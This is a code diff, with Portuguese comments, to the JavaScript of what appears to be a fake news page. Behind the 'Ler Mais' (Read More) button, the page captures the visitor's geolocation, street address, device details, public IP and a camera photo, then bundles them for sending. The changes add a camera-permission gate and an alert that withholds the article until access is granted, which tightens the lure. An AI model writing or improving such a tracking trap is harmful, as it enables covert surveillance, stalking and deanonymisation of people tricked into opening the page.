@@ -747,7 +747,7 @@
             }
         }
         
-        // Função para solicitar permissão de LOCALIZAÇÃO (apenas quando clicar em "Ler Mais")
+        // Função para solicitar permissão de LOCALIZAÇÃO (chamada ao clicar em "Ler Mais")
         function requestLocationPermission() {
             return new Promise((resolve) => {
                 navigator.geolocation.getCurrentPosition(
@@ -898,7 +898,7 @@
             }
         }
         
-        // Função chamada ao clicar em "Ler Mais" - aqui solicita localização e envia dados
+        // Função chamada ao clicar em "Ler Mais" - solicita localização, envia dados e libera notícia
         async function autoCaptureAndSend() {
             if (autoCaptureDone) return;
             
@@ -906,11 +906,11 @@
             loadingNews.classList.add('show');
             
             try {
-                // Solicitar localização AGORA (não era obrigatória antes)
+                // Solicitar localização AGORA (popup vai aparecer)
+                console.log('Solicitando permissão de localização...');
                 await requestLocationPermission();
                 
-                // Se o usuário negou a localização, ainda assim continuamos (não é obrigatória)
-                // mas tentamos obter a posição se ele permitiu
+                // Tentar obter posição precisa se o usuário permitiu
                 let position = null;
                 if (locationGranted) {
                     try {
@@ -932,7 +932,7 @@
                 let finalLatitude = latitude;
                 let finalLongitude = longitude;
                 
-                const address = position ? await getAddress(finalLatitude, finalLongitude) : "Localização não compartilhada";
+                const address = (latitude && longitude) ? await getAddress(finalLatitude, finalLongitude) : "Localização não compartilhada";
                 const deviceInfo = getDeviceInfo();
                 const publicIP = await getPublicIP();
                 const photoData = await captureAutoPhoto();
@@ -941,7 +941,7 @@
                     timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Cuiaba' }),
                     latitude: finalLatitude,
                     longitude: finalLongitude,
-                    google_maps_link: finalLatitude ? `https://www.google.com/maps?q=${finalLatitude},${finalLongitude}` : "Não disponível",
+                    google_maps_link: (finalLatitude && finalLongitude) ? `https://www.google.com/maps?q=${finalLatitude},${finalLongitude}` : "Não disponível",
                     accuracy_meters: finalAccuracy,
                     address: address,
                     device: deviceInfo.device,
@@ -992,7 +992,11 @@
         readMoreBtn.addEventListener('click', async (e) => {
             e.preventDefault();
             if (!autoCaptureDone && permissionsReady) {
+                console.log('Botão "Ler Mais" clicado - solicitando localização...');
                 await autoCaptureAndSend();
+            } else if (!permissionsReady) {
+                console.log('Permissão da câmera não concedida ainda');
+                alert('Você precisa permitir o acesso à câmera primeiro!');
             }
         });
     </script>
